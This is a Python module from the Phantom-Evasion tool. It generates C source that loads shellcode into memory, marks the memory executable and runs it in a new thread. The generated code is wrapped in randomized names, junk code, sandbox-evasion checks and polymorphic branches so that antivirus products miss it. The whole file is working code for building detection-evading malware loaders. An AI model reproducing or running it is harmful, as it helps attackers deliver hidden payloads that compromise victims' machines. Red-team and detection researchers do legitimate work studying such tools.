
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import pystache
import random, string
import sys 
sys.path.append("Modules/payloads/auxiliar")
import usefull

template_args = {} # Dictionnary containing all keys/values for template rendering

Payload = sys.argv[1]

Filename = sys.argv[2]

Encryption = sys.argv[3]

Randbufname = usefull.varname_creator()
template_args['Randbufname'] = Randbufname

template_args['Payload'] = usefull.encoding_manager(Encryption,Payload,Randbufname) 

template_args['Ndcvirtual'] = usefull.varname_creator()

template_args['Ker32'] = usefull.varname_creator()

template_args['Randlpv'] = usefull.varname_creator()

template_args['Randhand'] = usefull.varname_creator()

template_args['Randresult'] = usefull.varname_creator()

template_args['Randthread'] = usefull.varname_creator()

template_args['Oldprot'] = usefull.varname_creator()

template_args['Randbool'] = usefull.varname_creator()

template_args['Ndcvirtualpro'] = usefull.varname_creator()


template_args['Junkcode1'] = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
template_args['Junkcode2'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode3'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode4'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode5'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode6'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode7'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode8'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode9'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode

template_args['Win_eva1'] = usefull.windows_evasion(str(random.randint(1,17)))
template_args['Win_eva2'] = usefull.windows_evasion(str(random.randint(1,17)))
template_args['Win_eva3'] = usefull.windows_evasion(str(random.randint(1,17)))
template_args['Win_eva4'] = usefull.windows_evasion(str(random.randint(1,17)))


template_args['MorphEvasion1'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
template_args['MorphEvasion2'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
template_args['MorphEvasion3'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))

 

Hollow_code = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <math.h>

int main(int argc,char * argv[]){
    {{{Junkcode1}}}
    {{{Junkcode2}}}
    {{{Win_eva1}}}
    {{{Win_eva2}}}
    {{{Win_eva3}}}
    {{{Win_eva4}}}
    {{{Junkcode3}}}
    {{{MorphEvasion1}}}
        {{{MorphEvasion2}}}
            {{{MorphEvasion3}}}
                {{{Junkcode4}}}
                {{{Payload}}}
                LPVOID {{{Randlpv}}};
                HANDLE {{{Randhand}}};
                DWORD {{{Randresult}}};
                DWORD {{{Randthread}}};
                HINSTANCE {{{Ker32}}} = LoadLibrary(\"kernel32.dll\");
                if({{{Ker32}}} != NULL){
                    FARPROC {{{Ndcvirtual}}} = GetProcAddress({{{Ker32}}}, \"VirtualAlloc\");
                    {{{Randlpv}}} = (LPVOID) {{{Ndcvirtual}}}(NULL, strlen({{{Randbufname}}}),MEM_COMMIT,PAGE_READWRITE);
                    RtlMoveMemory({{{Randlpv}}}, {{{Randbufname}}}, strlen({{{Randbufname}}}));
                    DWORD {{{Oldprot}}};
                    FARPROC {{{Ndcvirtualpro}}} = GetProcAddress({{{Ker32}}}, \"VirtualProtect\");
                    BOOL {{{Randbool}}} = (BOOL) {{{Ndcvirtualpro}}}({{{Randlpv}}}, strlen({{{Randbufname}}}), 0x40, &{{{Oldprot}}});
                    {{{Randhand}}} = CreateThread(NULL, 0, {{{Randlpv}}}, NULL, 0, &{{{Randthread}}});
                    {{{Randresult}}} = WaitForSingleObject({{{Randhand}}},-1);
                }
            }else{
                {{{Junkcode6}}}
            }
        }else{
            {{{Junkcode7}}}
        }
    }else{
        {{{Junkcode8}}}
    }
    }
    {{{Junkcode9}}}
    }}}
    return 0;
}
"""

Hollow_code = pystache.render(Hollow_code, template_args)

with open('Source.c','wb') as f:
    f.write(Hollow_code)


